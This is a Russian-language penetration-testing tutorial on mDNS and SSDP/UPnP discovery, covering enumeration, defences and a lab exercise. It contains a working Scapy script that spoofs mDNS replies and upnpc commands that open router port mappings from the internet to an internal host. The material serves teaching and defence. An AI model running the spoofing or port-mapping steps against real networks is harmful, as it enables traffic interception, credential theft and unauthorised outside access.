Устройства в локальной сети любят рассказывать о себе: принтеры, камеры, ТВ, NAS, роутеры. Для этого есть протоколы «обнаружения» — **mDNS** (5353/udp) и **SSDP/UPnP** (1900/udp). Они удобны, но неаутентифицированы: любой в сети может перечислить активы, а иногда — перепрограммировать роутер через UPnP. Для пентеста это быстрый способ составить карту сети; для SOC — источник видимости и, одновременно, риск.

## mDNS: что и зачем

**mDNS** (multicast DNS) разрешает имена в домене `.local` без центрального DNS-сервера. Устройства шлют multicast-запросы на `224.0.0.251:5353` (или `ff02::fb`), а владельцы имён отвечают. Используется в Bonjour (Apple), Avahi (Linux), Windows (частично) для принтеров, AirPlay, Chromecast, файлообмена. Помимо имён, mDNS отдаёт **TXT-записи** с метаданными: модель, версия, иногда серийники и ID — ценная разведка.

```bash
# Слушать все mDNS-сервисы
avahi-browse -a -t -r
# Только определённый тип
avahi-browse _http._tcp -t -r
# Через nmap
sudo nmap -sU -p5353 --script dns-service-discovery <ip>
```

## SSDP/UPnP: обнаружение устройств

**SSDP** — часть UPnP. Устройства периодически рассылают `NOTIFY` на `239.255.255.250:1900`, а клиенты шлют `M-SEARCH` и получают ответ с URL описания (`LOCATION`). По этому URL лежит XML с типом устройства, версией, списком сервисов и **controlURL** для вызова действий.

```
M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
MAN: "ssdp:discover"
MX: 1
ST: ssdp:all
```

```bash
# Перечислить UPnP-устройства
upnpc -l
# Или nmap
sudo nmap -sU -p1900 --script upnp-info <ip>
# miranda/ssdp CLI
sudo ssdp scan
```

## Как discovery-протоколы утекают данные

- **Перечисление активов.** mDNS/SSDP раскрывают все устройства, их модели, сервисы, иногда версии — без единого скана портов.
- **TXT-метаданные.** Имена хостов, пользователи, пути, иногда токены.
- **UPnP description.** Полная карта сервисов устройства и адреса управления.
- **Утечка за пределы ЛВС.** Некоторые провайдеры/шлюзы неверно конфигурируют multicast-маршрутизацию.

## Разобранный пример: карта сети и UPnP port-mapping

1. Включаем сбор mDNS/SSDP:
   ```bash
   sudo tcpdump -i eth0 -nn -s0 'udp port 5353 or udp port 1900'
   ```
2. Параллельно запускаем активное перечисление:
   ```bash
   avahi-browse -a -t -r | tee mdns.txt
   upnpc -l | tee upnp.txt
   ```
3. Из `upnp.txt` берём controlURL роутера, например `http://192.168.1.1:5000/ctl/IPConn`.
4. Пробуем добавить port-mapping (в лабе с собственным роутером!):
   ```bash
   upnpc -a 192.168.1.100 4444 4444 TCP
   ```
   Если UPnP включён и не защищён, порт 4444 пробросится из интернета на внутренний хост.
5. Проверяем с внешнего IP — порт открыт. Это критическая находка: атакующий может пробросить себе доступ внутрь.

## Атаки на SSDP/UPnP

| Атака | Суть |
|---|---|
| UPnP port-mapping | Проброс портов из интернета без auth |
| SSRF к SSDP | Веб-сервис заставляет сервер шлёть M-SEARCH |
| SSDP amplification | Отражённый DDoS (ответ больше запроса) |
| Rogue UPnP | Подмена устройства, редирект controlURL |
| Reflected XSS в описании | Через XML-парсинг на клиенте |

SSDP-амплификация использовалась в крупных DDoS (ответ description в разы больше запроса). SSRF к SSDP — классика на веб-стендах: заставить сервер обратиться к `239.255.255.250:1900` и вернуть список внутренних устройств.

## Защита

| Мера | Против чего |
|---|---|
| Отключить UPnP на роутерах | Port-mapping, Rogue |
| Отключить mDNS/SSDP, где не нужны | Утечки активов |
| Сегментация IoT | Lateral movement |
| Фильтровать multicast на границе | Утечка наружу |
| Ограничить SSDP-ответы | Амплификация |
| Мониторинг аномальных M-SEARCH | SSRF/скан |

## Частые ошибки и подводные камни

- **Считать mDNS «безопасным discovery».** Он раскрывает метаданные любому в ЛВС.
- **Забывать про IPv6 multicast.** mDNS работает и по `ff02::fb`.
- **Пытаться управлять чужими устройствами.** UPnP-тесты — только в своей лабе/по договору.
- **Путать SSDP и UPnP.** SSDP — транспорт обнаружения; UPnP — стек поверх него.
- **Игнорировать `LOCATION`.** Именно там лежит XML с уязвимыми controlURL.
- **Считать UPnP выключенным.** На домашних роутерах он часто включён по умолчанию.

## Что дальше / решение

Discovery-протоколы дают «бесплатную» карту сети; свяжите их с `network-service-enum` и IoT-веткой (hardware). Дальше — SSRF (web-ветка) и amplификация (`network-ntp-attacks`). Для защиты отключите UPnP, сегментируйте IoT и фильтруйте multicast. Для CTF потренируйтесь в разборе M-SEARCH/SSDP-дампов и в извлечении controlURL.

## mDNS-спуфинг и отравление

mDNS так же неаутентифицирован, как LLMNR/NBT-NS, и его можно отравить. Если клиент ищет `printer.local`, атакующий отвечает «это я», и клиент подключается к нему. Сценарии:

- **Подмена сервиса.** Притвориться принтером/файловым сервером и выманить данные или креды.
- **Подмена update-сервера.** Если устройство ищет сервер обновлений по mDNS — подсунуть свой.
- **Отравление AirPlay/Chromecast.** Перенаправить медиапоток.
- **DoS через конфликт имён.** Отвечать на все запросы, создавая хаос.

```bash
# Прослушать, что ищут клиенты
sudo tcpdump -i eth0 -nn 'udp port 5353' -A | grep -i "\.local"
# Ответить от имени искомого имени (Scapy)
python3 -c "
from scapy.all import *
def cb(p):
    if p.haslayer(DNSQR) and b'.local' in p[DNSQR].qname:
        ans = IP(dst=p[IP].src)/UDP(sport=5353,dport=5353)/DNS(id=p[DNS].id, qr=1, aa=1,
            qd=p[DNS].qd, an=DNSRR(rrname=p[DNSQR].qname, rdata='10.0.0.66', ttl=120))
        send(ans, verbose=0)
sniff(filter='udp port 5353', prn=cb)
"
```

Это родственно `network-netbios-llmnr`, только для Apple/Linux/IoT-экосистем.

## UPnP-эксплуатация в деталях

UPnP-описание (`LOCATION`) — это XML с сервисами и `controlURL`. Опасные действия:

- **AddPortMapping** — проброс порта наружу (см. пример выше);
- **DeletePortMapping** — снятие чужого проброса (DoS/нарушение политики);
- **GetGenericPortMappingEntry** — перечисление всех пробросов;
- **SetConnectionType** — изменение режима подключения WAN.

Проверка через `upnpc -l` покажет список существующих пробросов — иногда там открыты RDP/SSH в интернет. Для автоматизации можно использовать `miranda` (Python UPnP) или `miniupnpc` из скриптов. На роутерах с WAN-UPnP это критично: любой в ЛВС (или заражённое устройство) может открыть доступ извне. Дополнительно встречается **UPnP-SSRF**: если на роутере есть веб-интерфейс, парсящий XML из внешнего источника, возможна подмена controlURL на внутренний адрес.

## Лаборатория: карта и защита

1. Поднимите в изолированной сети Linux-машину с Avahi и роутер с UPnP (или OpenWrt/`miniupnpd`).
2. `avahi-browse -a -t -r` — соберите mDNS-сервисы и TXT-метаданные.
3. `upnpc -l` — перечислите пробросы и controlURL.
4. Создайте проброс: `upnpc -a <внутр. ip> 4444 4444 TCP`, проверьте доступ снаружи.
5. Отключите UPnP (`miniupnpd` stop / настройка роутера) и повторите — проброс не создастся.
6. Отключите Avahi (`systemctl disable --now avahi-daemon`) и убедитесь, что mDNS-утечки прекратились.

Так вы видите, как discovery превращается в экспозицию и как её закрыть.
